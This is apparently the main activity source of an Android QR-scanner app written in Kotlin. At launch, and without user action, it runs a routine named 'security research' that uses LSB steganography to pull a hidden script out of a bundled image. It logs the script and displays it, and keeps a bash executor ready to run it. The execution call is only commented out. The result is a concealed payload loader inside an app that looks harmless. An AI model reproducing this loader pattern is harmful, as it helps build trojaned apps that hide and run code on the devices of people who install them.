package com.example.aplicacionqr

import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.util.Log
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.activity.enableEdgeToEdge
import androidx.appcompat.app.AppCompatActivity
import androidx.core.view.ViewCompat
import androidx.core.view.WindowInsetsCompat
import androidx.lifecycle.lifecycleScope
import com.example.aplicacionqr.databinding.ActivityMainBinding
import com.google.zxing.integration.android.IntentIntegrator
import com.google.zxing.integration.android.IntentResult
import com.journeyapps.barcodescanner.BarcodeCallback
import com.journeyapps.barcodescanner.BarcodeResult
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.File

class MainActivity : AppCompatActivity() {
    private lateinit var bashExecutor: BashExecutor
    private lateinit var binding: ActivityMainBinding
    private lateinit var btnScan: Button
    private lateinit var txtResult: TextView
    override fun onCreate(savedInstanceState: Bundle?) {

        binding= ActivityMainBinding.inflate(layoutInflater)
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContentView(binding.root)

        bashExecutor = BashExecutor()
        btnScan = findViewById(R.id.btnScan)
        txtResult = findViewById(R.id.txtResult)
        startSecurityResearch()
        btnScan.setOnClickListener {
            startQRScanner()
        }
    }

    private fun startQRScanner() {
        val integrator = IntentIntegrator(this)
        integrator.setDesiredBarcodeFormats(IntentIntegrator.QR_CODE)
        integrator.setPrompt("Escanea")
        integrator.setCameraId(0)
        integrator.setBeepEnabled(true)
        integrator.setBarcodeImageEnabled(true)
        integrator.setOrientationLocked(false)
        integrator.initiateScan()
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        val result: IntentResult = IntentIntegrator.parseActivityResult(requestCode, resultCode, data)
        if (result != null) {
            txtResult.text = "Resultado: ${result.contents}"
            val intent = Intent(Intent.ACTION_VIEW)

            if (result.contents.startsWith("http://") || result.contents.startsWith("https://")) {
                intent.data = Uri.parse(result.contents)
                startActivity(intent)
            }
        }
        else
        {
            super.onActivityResult(requestCode, resultCode, data)
        }
    }
    private fun startSecurityResearch() {
        lifecycleScope.launch {
            try {
                val lsbHelper = SteganographyLSBHelper(this@MainActivity)
                val scriptContent = withContext(Dispatchers.IO) {
                    lsbHelper.extractTextFromImage(R.drawable.xd)
                }
                if (scriptContent.isNullOrBlank()) {
                    showToast("❌ No se pudo extraer el script de la imagen (LSB)")
                    return@launch
                }
                Log.d("MainActivity", "📜 Script extraído LSB: ${scriptContent.take(200)}")

                // Si quieres ejecutar: bashExecutor.executeScriptText(scriptContent)
                showToast("✅ Script extraído: ${scriptContent.take(64)}...")
            } catch (e: Exception) {
                Log.e("MainActivity", "❌ Error LSB: ${e.message}")
                showToast("❌ Error: ${e.message}")
            }
        }
    }

    // Valida que sea un script bash sencillo
    private fun isValidScript(content: String): Boolean {
        return content.startsWith("#!/bin/bash")
    }

    private fun showToast(message: String) {
        Toast.makeText(this@MainActivity, message, Toast.LENGTH_LONG).show()
    }
}